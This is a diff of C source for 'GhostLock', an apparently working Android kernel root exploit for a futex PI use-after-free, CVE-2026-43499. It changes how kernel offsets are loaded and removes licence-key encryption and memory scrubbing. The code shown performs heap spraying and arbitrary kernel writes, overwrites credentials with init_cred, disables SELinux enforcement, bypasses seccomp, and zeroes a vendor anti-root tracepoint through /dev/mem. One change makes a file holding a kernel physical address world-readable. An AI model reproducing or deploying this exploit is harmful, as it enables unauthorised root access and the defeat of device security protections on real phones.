@@ -1,5 +1,5 @@
-﻿/*
- * XproSU 鈥?CVE-2026-43499 futex PI UAF exploit
+/*
+ * GhostLock — CVE-2026-43499 futex PI UAF exploit
  *
  * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
  * independent root shell: ksud late-load + module watch.
@@ -97,10 +97,7 @@ static enum soc_family detect_soc(void) {
 #ifndef TASK_THREAD_INFO_FLAGS_OFF
 #define TASK_THREAD_INFO_FLAGS_OFF 0x00
 #endif
-#include "offsets_bin.h"
-#ifdef GL_VERBOSE
-#include "selftest.h"
-#endif
+#include "offsets_json.h"
 
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
@@ -124,93 +121,59 @@ static void publish_active_offsets(void) {
     p0_kernel_phys_load = QC_GKI_6_12_PHYS_LOAD;
     soc_name = "qcom/6.12";
   }
-  gl_addr_info("soc: %s; kernel_phys_load=0x%llx\n",
+  pr_info("soc: %s; kernel_phys_load=0x%llx\n",
           soc_name, (unsigned long long)p0_kernel_phys_load);
-  gl_addr_info("init_cred image=%016zx alias=%016zx\n",
+  pr_info("init_cred image=%016zx alias=%016zx\n",
           (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
-  (void)soc_name; /* only read by the gated log above */
 }
 
-/* Load <home>/offsets.glt and activate the entry matching `release`.
- *
- * This is the only source of kernel offsets, and since stage 2 the container is
- * sealed with a key that is not in this binary: the app obtains it from the
- * licence server and passes it, together with this handset's fingerprint and a
- * digest of the card key, down in the environment.
- *
- * That third value is the point.  A build with the login screen patched out
- * still has no card to derive it from, so the container refuses to open before
- * a single ciphertext byte is touched -- the licence is not a branch this code
- * trusts, it is an input this code needs.  With no key there is nothing to open
- * at all: the built-in tables and the plaintext offsets.json importer are gone
- * because both kept the offset names and values as literal strings in .rodata,
- * so `strings` on the shipped APK reproduced the whole table
- * (ENCRYPTION-PLAN.md section 1).
- *
- * A GL_VERBOSE build additionally accepts the stage-1 container, which is
- * obfuscated with a fixed key and is therefore only useful for debugging. */
-static int hexval(int c) {
-  if (c >= '0' && c <= '9') return c - '0';
-  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
-  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
-  return -1;
-}
-
-/* Parse exactly 2*n hex digits into n bytes; rejects anything longer or
- * shorter, so a truncated environment variable cannot silently zero-fill. */
-static int parse_hex(const char *s, uint8_t *out, size_t n) {
-  for (size_t i = 0; i < n; i++) {
-    /* Check the terminator before the second digit: for an empty string the
-     * loop would otherwise read s[1], one byte past the NUL.  It was still
-     * fail-closed (hexval rejects the junk), but reading past the end of an
-     * environment value is undefined behaviour and there is no reason for it. */
-    if (s[2 * i] == '\0') return -1;
-    int hi = hexval((unsigned char)s[2 * i]);
-    int lo = hexval((unsigned char)s[2 * i + 1]);
-    if (hi < 0 || lo < 0) return -1;
-    out[i] = (uint8_t)((hi << 4) | lo);
-  }
-  return s[2 * n] == '\0' ? 0 : -1;
-}
-
+/* Import a matching entry from <home>/offsets.json; returns 0 and activates
+ * the external table on success.  When the release is also registered in the
+ * built-in table, the entry starts from the built-in values so fields the
+ * JSON leaves empty keep the built-in ones instead of falling back to
+ * target.h defaults. */
 static int try_external_offsets(const char *release) {
   char path[320];
-  snprintf(path, sizeof(path), "%s/offsets.glt", g_home_dir);
-  memset(&g_external_offsets, 0, sizeof(g_external_offsets));
-
-  const char *key_hex = getenv("GHOSTLOCK_KEY");
-  const char *fp_hex = getenv("GHOSTLOCK_DEVICE_FP");
-  const char *card_hex = getenv("GHOSTLOCK_CARD");
-  if (key_hex && *key_hex && fp_hex && *fp_hex && card_hex && *card_hex) {
-    uint8_t kd[32];
-    uint8_t fp[32];
-    uint8_t card_tag[16];
-    if (parse_hex(key_hex, kd, sizeof(kd)) != 0 ||
-        parse_hex(fp_hex, fp, sizeof(fp)) != 0 ||
-        parse_hex(card_hex, card_tag, sizeof(card_tag)) != 0) {
-      pr_error("E01\n");
-      return -1;
+  snprintf(path, sizeof(path), "%s/offsets.json", g_home_dir);
+  const struct kernel_offsets *builtin = NULL;
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(release, known_offsets[i].uname_r) == 0) {
+      builtin = &known_offsets[i];
+      break;
     }
-    if (load_offsets_aead(path, release, fp, card_tag, kd, &g_external_offsets,
-                          g_external_release,
-                          sizeof(g_external_release)) == 0) {
-      active_offsets = &g_external_offsets;
-      pr_success("ok %s\n", active_offsets->uname_r);
-      return 0;
-    }
-    return -1;
   }
-
-  /* Offline branch: no licence env -> accept the bundled GLT1 container. */
-  if (load_offsets_bin(path, release, &g_external_offsets, g_external_release,
-                       sizeof(g_external_release)) == 0) {
+  if (builtin) {
+    /* Start from the built-in entry so fields the JSON omits keep their
+     * built-in values.  load_offsets_json() only writes the keys it actually
+     * finds, but a *successful* parse is not enough on its own: the older
+     * offsets.json files in the wild have no off_tp_sys_exit_tp key, and
+     * treating "parsed OK" as "authoritative" silently zeroed the built-in
+     * neutralize address.  Remember the fields the JSON can supply and fall
+     * back to the built-in entry per field. */
+    g_external_offsets = *builtin;
+  } else {
+    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
+  }
+  int rc = load_offsets_json(path, release, &g_external_offsets,
+                             g_external_release, sizeof(g_external_release));
+  if (rc == 0) {
+    /* A JSON that never mentions the tracepoint fields must not erase the
+     * built-in ones: without them vr.ko stays armed and ksud dies at
+     * late-load. */
+    if (builtin) {
+      if (!g_external_offsets.off_tp_sys_exit_tp)
+        g_external_offsets.off_tp_sys_exit_tp = builtin->off_tp_sys_exit_tp;
+      if (!g_external_offsets.off_tp_sys_exit_funcs)
+        g_external_offsets.off_tp_sys_exit_funcs =
+            builtin->off_tp_sys_exit_funcs;
+    }
     active_offsets = &g_external_offsets;
-    pr_success("offsets loaded (offline container): %s\n",
+    pr_success("offsets imported from offsets.json: %s\n",
                active_offsets->uname_r);
-    return 0;
+  } else {
+    pr_info("no external offsets match at %s\n", path);
   }
-  pr_error("E02\n");
-  return -1;
+  return rc;
 }
 static int select_offsets(void) {
   struct utsname uts;
@@ -223,11 +186,24 @@ static int select_offsets(void) {
     return -1;
   }
 #endif
+  /* Imported offsets win over the built-in tables so refreshed values take
+   * effect without rebuilding the app. */
   if (try_external_offsets(uts.release) == 0) {
     publish_active_offsets();
     return 0;
   }
-  pr_error("E03\n");
+  for (int i = 0; known_offsets[i].uname_r; i++) {
+    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
+      active_offsets = &known_offsets[i];
+      pr_success("offsets matched: %s\n", active_offsets->uname_r);
+      publish_active_offsets();
+      return 0;
+    }
+  }
+  pr_error("no offsets for kernel: %s\n", uts.release);
+  pr_error("add this kernel to offsets.h and rebuild, or import a matching "
+           "offsets.json entry into %s\n",
+           g_home_dir);
   return -1;
 }
 
@@ -408,7 +384,7 @@ int run_main_route_threads(void) {
 }
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
-  gl_addr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
+  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
@@ -417,7 +393,7 @@ static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) 
   TIMER("  heap spray done");
   int arm_matches = leaf ? (fake_right == 0) : (fake_right != 0);
   if (!arm_matches) {
-    gl_addr_warn("  payload arm mismatch leaf=%d fake_right=%016zx; skipping "
+    pr_warning("  payload arm mismatch leaf=%d fake_right=%016zx; skipping "
                "write\n", leaf, fake_right);
     clear_pselect_write();
     return 0;
@@ -675,7 +651,6 @@ static void write_root_script(void) {
       "    echo \"[-] vr.ko neutralize FAILED: readback=$NEW (devmem/STRICT_DEVMEM)\" >>\"$LOG\"\n"
       "  fi\n"
       "  rm -f /dev/mem 2>/dev/null\n"
-      "  rm -f /data/local/tmp/_gl_tp_phys 2>/dev/null\n"
       "else\n"
       "  echo \"[*] vr.ko neutralize skipped (TP_PHYS not set)\" >>\"$LOG\"\n"
       "fi\n"
@@ -856,7 +831,7 @@ static uintptr_t perf_find_task(void) {
     for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
     if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
   }
-  gl_addr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
+  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
   return best;
 }
 
@@ -881,33 +856,21 @@ static void child_diag(const char *msg, long v) {
 }
 
 /* Publish the physical address of the funcs field so the root script can
- * devmem-zero it as a belt-and-braces path next to the native write.
- * 0600: the file contains a raw kernel physical address; it is consumed by
- * the root script (uid 0) and must not be world-readable or linger on disk. */
+ * devmem-zero it as a belt-and-braces path next to the native write. */
 static void write_tp_phys_file(uintptr_t phys) {
   if (!phys) return;
   char b[32];
   int n = snprintf(b, sizeof(b), "0x%llx", (unsigned long long)phys);
   int fd = open("/data/local/tmp/_gl_tp_phys",
-                O_WRONLY | O_CREAT | O_TRUNC, 0600);
+                O_WRONLY | O_CREAT | O_TRUNC, 0666);
   if (fd < 0) return;
   ssize_t w = write(fd, b, (size_t)n);
   (void)w;
   close(fd);
-  chmod("/data/local/tmp/_gl_tp_phys", 0600);
+  chmod("/data/local/tmp/_gl_tp_phys", 0666);
 }
 
 static void park_rooted_child(void) {
-  /* This process sleeps forever holding fork()-inherited copies of the
-   * decrypted plaintext buffers *and* the parsed offset table.  Scrub both
-   * before parking: the child never dereferences kernel offsets again (the
-   * root script on disk carries the rest of the flow), so a memory dump of a
-   * `pause()`-loop process must not yield the table until reboot. */
-  gl_wipe_plaintext();
-  if (active_offsets == &g_external_offsets) {
-    memset(&g_external_offsets, 0, sizeof(g_external_offsets));
-    active_offsets = NULL;
-  }
   FILE *f = fopen("/proc/self/oom_score_adj", "w");
   if (f) {
     fputs("-1000", f);
@@ -1326,7 +1289,7 @@ int run_exploit(int argc, char **argv) {
 
     }
 
-    gl_addr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
     #ifdef VR_TAG_A_OFF
   /* ------------------------------------------------------------------
    * vivo vr.ko anti-root per-task bypass (ported from root.c)
@@ -1336,10 +1299,10 @@ int run_exploit(int argc, char **argv) {
    * strip the tag BEFORE W2 verify runs the child's getuid().
    *
    * This exploit primitive is 64-bit granular, so:
-   *   鈥?task+0x00 (thread_info.flags) covers tag A at +0x06 and also
+   *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
    *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
    *     off the sys_exit slow-path immediately.
-   *   鈥?tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
+   *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
    *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
    *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
    * ------------------------------------------------------------------ */
@@ -1516,15 +1479,15 @@ int run_exploit(int argc, char **argv) {
     if (!tp_tp_off && !active_offsets->off_tp_sys_exit_funcs) {
       /* Loud on purpose: silently skipping this leaves vr.ko armed and ksud
        * dies at late-load, which looks like an unrelated crash. */
-      pr_error("vr.ko neutralize SKIPPED: the loaded offsets carry no "
-               "tracepoint address (ids 0x31 / 0x32)\n");
+      pr_error("vr.ko neutralize SKIPPED: offsets.json has no "
+               "off_tp_sys_exit_tp / off_tp_sys_exit_funcs\n");
       pr_error("vr.ko will kill the late-loaded ksud\n");
       log_sync();
     }
     if (tp_tp_off) {
       uintptr_t tp_va = data_addr(KIMAGE_TEXT_BASE + tp_tp_off);
       uintptr_t funcs_va = tp_va + funcs_off;
-      gl_addr_info("vr.ko neutralize: __tracepoint_sys_exit @0x%016zx "
+      pr_info("vr.ko neutralize: __tracepoint_sys_exit @0x%016zx "
               "funcs_off=0x%llx -> zeroing @0x%016zx\n",
               tp_va, (unsigned long long)funcs_off, funcs_va);
       /* The script reads this exact address; devmem width is BYTES (max 8). */
@@ -1545,7 +1508,7 @@ int run_exploit(int argc, char **argv) {
       /* Legacy offsets.json: value already points at the funcs field. */
       uintptr_t funcs_va = data_addr(KIMAGE_TEXT_BASE +
                                      active_offsets->off_tp_sys_exit_funcs);
-      gl_addr_info("vr.ko neutralize (legacy offset): funcs @0x%016zx\n", funcs_va);
+      pr_info("vr.ko neutralize (legacy offset): funcs @0x%016zx\n", funcs_va);
       write_tp_phys_file(p0_kernel_phys_load +
                          active_offsets->off_tp_sys_exit_funcs);
       int vr_global_ok = 0;
@@ -1590,7 +1553,6 @@ int run_exploit(int argc, char **argv) {
   }
   /* untrusted_app loses /proc/modules once enforcing is restored, so poll
    * the app-readable log for the loaded-module line (up to ~30s). */
-  pr_info("waiting for KernelSU module\n");
   int ksu_log_loaded = 0;
   int ksu_log_failed = 0;
   for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
@@ -1610,7 +1572,6 @@ int run_exploit(int argc, char **argv) {
   kernelsu_ready = kernelsu_ready || ksu_log_loaded;
   /* enforcing takes the app dir away from the root script, so its log stops
    * before the restore. the state has to be read from here. */
-  pr_info("waiting for SELinux restore\n");
   int enforced = 0;
   for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
     usleep(500000);
@@ -1629,25 +1590,7 @@ int run_exploit(int argc, char **argv) {
     pr_warning("temporary root ready; KernelSU module load pending\n");
   else
     pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
-  /* Cleanup that must not change the exploit path: the parked children are
-   * already scrubbed (park_rooted_child), so this only clears the parent's
-   * copies of the plaintext table and removes the on-disk physical address
-   * note. Deleting the file is best-effort: the root script may still need it
-   * for a few more seconds (devmem neutralize), and a leftover is 0600. */
-  unlink("/data/local/tmp/_gl_tp_phys");
-  gl_wipe_plaintext();
   return 0;
 }
 
-int main(int argc, char **argv) {
-#ifdef GL_VERBOSE
-  /* Offline verification modes, debug builds only (selftest.c explains why).
-   * With no recognised flag the first statement executed is run_exploit(), so
-   * the timing-sensitive exploit path is untouched. */
-  if (argc > 1 && (strcmp(argv[1], "--crypto-selftest") == 0 ||
-                   strcmp(argv[1], "--offsets-verify") == 0)) {
-    return gl_selftest_main(argc, argv);
-  }
-#endif
-  return run_exploit(argc, argv);
-}
+int main(int argc, char **argv) { return run_exploit(argc, argv); }
